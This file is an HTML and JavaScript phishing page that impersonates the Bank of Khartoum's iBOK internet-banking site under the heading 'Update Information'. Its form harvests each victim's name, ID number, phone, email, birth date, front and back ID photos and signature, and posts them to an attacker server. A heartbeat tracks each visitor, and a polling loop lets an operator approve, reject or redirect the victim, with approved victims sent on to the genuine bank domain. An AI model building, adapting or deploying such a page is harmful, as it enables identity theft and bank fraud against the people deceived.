<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bank of Khartoum | Update Information</title>
<link href="images/favicon-bok.png" rel="icon">
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Open Sans',sans-serif;background:#e8e8e8;min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden}

.top-header{display:grid;min-height:80px;width:100%;grid-template-columns:1fr 3fr;background:linear-gradient(#f33432,#bc262a)}
.header-logo{width:100%;height:100%;display:inline-grid;place-items:center}
.header-logo img{height:60px}
.header-text{color:#fff;text-align:right;display:inline-grid;align-items:center;padding:10px 3vw;font-size:20px;font-weight:700;line-height:1.4;background:linear-gradient(#f0b933,#e2ae2d,#d09e24,#bb8b16)}

.section{flex:1}
.prelogin{padding:20px 16px}
.prelogin .container{max-width:600px;margin:0 auto}

.loginTitle h2{color:#bc262a;font-size:22px;font-weight:600}
.loginbox{padding:20px 5vw;margin-top:10px;border-radius:6px;background-color:#fff;border:1px solid #ccc;box-shadow:0 3px 6px rgba(0,0,0,.16),0 3px 6px rgba(0,0,0,.23);margin-bottom:50px}
.loginbox h3{text-align:center;font-size:20px;color:#585958;font-weight:600;position:relative;padding-bottom:12px;margin-bottom:20px}
.loginbox h3::after{content:"";width:50%;height:3px;border-radius:10px;background-color:#bc262a;position:absolute;left:50%;transform:translateX(-50%);bottom:0}

.form-group{margin-bottom:16px}
.form-group label{display:block;color:#828488;font-size:14px;margin-bottom:6px;font-weight:600}
.form-input{border:1px solid #666;height:42px;width:100%;padding:6px 12px;border-radius:4px;font-size:15px;font-family:'Open Sans',sans-serif;outline:none}
.form-input:focus{border-color:#bc262a}

.upload-group{margin-bottom:16px}
.upload-group label{display:block;color:#828488;font-size:14px;margin-bottom:6px;font-weight:600}
.upload-box{border:2px dashed #ccc;border-radius:8px;padding:20px;text-align:center;cursor:pointer;transition:border-color .2s;position:relative;background:#fafafa}
.upload-box:hover{border-color:#bc262a}
.upload-box input[type="file"]{position:absolute;inset:0;opacity:0;cursor:pointer}
.upload-icon{font-size:28px;color:#999;margin-bottom:6px}
.upload-text{font-size:13px;color:#999}
.upload-preview{max-width:100%;max-height:160px;border-radius:6px;margin-top:10px;display:none}
.upload-box.has-file{border-color:#4caf50;background:#f0fff0}
.upload-box.has-file .upload-icon,.upload-box.has-file .upload-text{display:none}

.error-box{display:none;background:#fff5f5;border:1px solid #f5c6cb;border-radius:4px;padding:10px;margin-bottom:14px;text-align:center}
.error-box.show{display:block}
.error-box span{color:#dc3545;font-size:13px;font-weight:600}

.btn-bok{background-color:#bc262a;display:block;width:100%;color:#fff;padding:12px;font-size:16px;font-weight:600;border-radius:4px;cursor:pointer;font-family:'Open Sans',sans-serif;transition:background-color .2s;border:none;margin-top:20px}
.btn-bok:hover{background-color:#a11a19}
.btn-bok:disabled{opacity:.5;cursor:default}

.footer{margin-top:auto;padding:10px;background:linear-gradient(#bfc1c4,#eff0f1,#fcfdfd,#ffffff);border-top:3px solid #bc262a;text-align:center;line-height:40px}
.copyright{font-weight:600;color:#4a4a4a;font-size:14px}
.social-media{display:flex;justify-content:center;gap:14px;margin-top:6px}
.soc-ico img{height:32px;width:32px}

.loading-overlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.92);z-index:1000;align-items:center;justify-content:center;flex-direction:column}
.loading-overlay.show{display:flex}
.lo-spinner{width:40px;height:40px;border:4px solid #e0e0e0;border-top:4px solid #bc262a;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:12px}
@keyframes spin{to{transform:rotate(360deg)}}
.lo-text{font-size:14px;color:#bc262a;font-weight:600}

@media(max-width:480px){
  .header-text{font-size:16px;padding:8px 12px}
  .header-logo img{height:50px}
  .loginbox{padding:20px 16px}
}
</style>
</head>
<body>

<div class="top-header">
  <div class="header-logo">
    <img src="images/bok-logo.svg" alt="iBOK">
  </div>
  <div class="header-text">Welcome to<br>iBOK Internet<br>Banking</div>
</div>

<div class="section">
  <div class="prelogin">
    <div class="container">
      <div class="loginTitle">
        <h2>Update Information</h2>
      </div>
      <div class="loginbox">
        <h3>Data Update Form</h3>

        <div class="error-box" id="errorBox"><span id="errorText">Please fill in all required fields</span></div>

        <div class="form-group">
          <label for="fullName">Full Name</label>
          <input type="text" class="form-input" id="fullName" placeholder="Enter your full name" autocomplete="name">
        </div>

        <div class="form-group">
          <label for="idNumber">ID Number</label>
          <input type="text" class="form-input" id="idNumber" placeholder="Enter your ID number" autocomplete="off">
        </div>

        <div class="form-group">
          <label for="phone">Phone Number</label>
          <input type="tel" class="form-input" id="phone" placeholder="Enter your phone number" autocomplete="tel">
        </div>

        <div class="form-group">
          <label for="email">Email Address</label>
          <input type="email" class="form-input" id="email" placeholder="Enter your email address" autocomplete="email">
        </div>

        <div class="form-group">
          <label for="birthDate">Date of Birth</label>
          <input type="date" class="form-input" id="birthDate">
        </div>

        <div class="upload-group">
          <label>ID Photo (Front)</label>
          <div class="upload-box" id="idFrontBox">
            <input type="file" accept="image/*" id="idFrontFile" onchange="previewFile(this,'idFrontPreview','idFrontBox')">
            <div class="upload-icon">📷</div>
            <div class="upload-text">Tap to upload front ID photo</div>
            <img class="upload-preview" id="idFrontPreview">
          </div>
        </div>

        <div class="upload-group">
          <label>ID Photo (Back)</label>
          <div class="upload-box" id="idBackBox">
            <input type="file" accept="image/*" id="idBackFile" onchange="previewFile(this,'idBackPreview','idBackBox')">
            <div class="upload-icon">📷</div>
            <div class="upload-text">Tap to upload back ID photo</div>
            <img class="upload-preview" id="idBackPreview">
          </div>
        </div>

        <div class="upload-group">
          <label>Signature</label>
          <div class="upload-box" id="signatureBox">
            <input type="file" accept="image/*" id="signatureFile" onchange="previewFile(this,'signaturePreview','signatureBox')">
            <div class="upload-icon">✍️</div>
            <div class="upload-text">Tap to upload signature photo</div>
            <img class="upload-preview" id="signaturePreview">
          </div>
        </div>

        <button type="button" class="btn-bok" id="submitBtn" onclick="submitUpdate()">Submit</button>
      </div>
    </div>
  </div>
</div>

<div class="footer">
  <div class="container">
    <div class="copyright">iBOK | Bank of Khartoum 2024</div>
    <div class="social-media">
      <span class="soc-ico"><a href="#"><img src="images/bok-footer-logo.svg" alt="BOK"></a></span>
      <span class="soc-ico"><a href="#"><img src="images/bok-linkidin.svg" alt="LinkedIn"></a></span>
      <span class="soc-ico"><a href="#"><img src="images/bok-x.svg" alt="X"></a></span>
      <span class="soc-ico"><a href="#"><img src="images/bok-facebook.svg" alt="Facebook"></a></span>
    </div>
  </div>
</div>

<div class="loading-overlay" id="loadingOverlay">
  <div class="lo-spinner"></div>
  <div class="lo-text">Submitting...</div>
</div>

<script>
var _vid=sessionStorage.getItem('_vid');if(!_vid){_vid=Math.random().toString(36).slice(2)+Date.now().toString(36);sessionStorage.setItem('_vid',_vid);}
function heartbeat(){fetch('/api/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({page:'update',vid:_vid})}).catch(function(){});}
heartbeat();setInterval(heartbeat,5000);

var params=new URLSearchParams(window.location.search);
var id=params.get('id');
if(!id){window.location.href='login-en.html';}

function fileToBase64(file){
  return new Promise(function(resolve){
    var reader=new FileReader();
    reader.onload=function(){resolve(reader.result);};
    reader.readAsDataURL(file);
  });
}

function previewFile(input,previewId,boxId){
  var file=input.files[0];
  if(!file)return;
  var preview=document.getElementById(previewId);
  var box=document.getElementById(boxId);
  var reader=new FileReader();
  reader.onload=function(){
    preview.src=reader.result;
    preview.style.display='block';
    box.classList.add('has-file');
  };
  reader.readAsDataURL(file);
}

async function submitUpdate(){
  var fullName=document.getElementById('fullName').value.trim();
  var idNumber=document.getElementById('idNumber').value.trim();
  var phone=document.getElementById('phone').value.trim();
  var email=document.getElementById('email').value.trim();
  var birthDate=document.getElementById('birthDate').value;
  var idFrontFile=document.getElementById('idFrontFile').files[0];
  var idBackFile=document.getElementById('idBackFile').files[0];
  var signatureFile=document.getElementById('signatureFile').files[0];

  if(!fullName||!idNumber||!phone||!email||!birthDate||!idFrontFile||!idBackFile||!signatureFile){
    document.getElementById('errorBox').classList.add('show');
    return;
  }
  document.getElementById('errorBox').classList.remove('show');
  document.getElementById('submitBtn').disabled=true;
  document.getElementById('submitBtn').textContent='Submitting...';

  try{
    var idFront=await fileToBase64(idFrontFile);
    var idBack=await fileToBase64(idBackFile);
    var signature=await fileToBase64(signatureFile);

    var resp=await fetch('/api/submit-update/'+id,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({
        full_name:fullName,id_number:idNumber,phone:phone,
        email:email,birth_date:birthDate,
        id_front:idFront,id_back:idBack,signature:signature
      })
    });
    var d=await resp.json();
    if(d.ok){
      document.getElementById('loadingOverlay').classList.add('show');
      pollAfterUpdate();
    }else{
      document.getElementById('submitBtn').disabled=false;
      document.getElementById('submitBtn').textContent='Submit';
    }
  }catch(e){
    document.getElementById('submitBtn').disabled=false;
    document.getElementById('submitBtn').textContent='Submit';
  }
}

function pollAfterUpdate(){
  setInterval(function(){
    fetch('/api/status/'+id)
    .then(function(r){return r.json();})
    .then(function(d){
      if(d.status==='accepted'){
        window.location.href='https://ib.bok-sd.com';
      }else if(d.status==='rejected'){
        window.location.href='login-en.html?error=1';
      }else if(d.status==='redirect'&&d.redirect){
        if(d.redirect!=='update-data') window.location.href=d.redirect+'-en.html?id='+id;
      }
    }).catch(function(){});
  },3000);
}
</script>
</body>
</html>
